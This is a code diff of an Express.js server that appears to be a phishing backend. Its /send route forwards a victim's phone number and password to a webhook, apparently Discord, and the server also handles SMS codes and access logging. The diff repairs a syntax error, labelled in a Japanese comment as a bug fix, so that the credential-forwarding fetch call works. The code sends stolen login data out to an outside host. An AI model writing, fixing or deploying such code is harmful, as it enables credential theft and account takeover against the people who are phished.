@@ -2,8 +2,6 @@ const express = require("express");
 const app = express();
 const { getAccessLog } = require("./dist/Access");
 
-
-
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static("."));
 
@@ -22,15 +20,16 @@ app.post("/send", async (req, res) => {
   }
 
   try {
+    // 【バグ修正】カッコの閉じ忘れ（ }); ）を正しく補完
     await fetch(webhook, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
-            body: JSON.stringify({
+      body: JSON.stringify({
         content: `\ntel: ${cleanPhone}\npass: ${password}`
       })
-
+    });
 
     console.log("ログイン情報 送信成功");
 
@@ -72,8 +71,8 @@ app.post("/send-sms", async (req, res) => {
     res.status(500).send("エラー");
   }
 });
-app.post("/log-access", async (req, res) => {
 
+app.post("/log-access", async (req, res) => {
   const accessWebhook = process.env.ACCESS_WEBHOOK || process.env.DISCORD_WEBHOOK;
 
   try {
@@ -91,8 +90,6 @@ app.post("/log-access", async (req, res) => {
     res.status(500).send("Error");
   }
 });
-
-
 
 app.listen(process.env.PORT || 3000, () => {
   console.log("Server started");
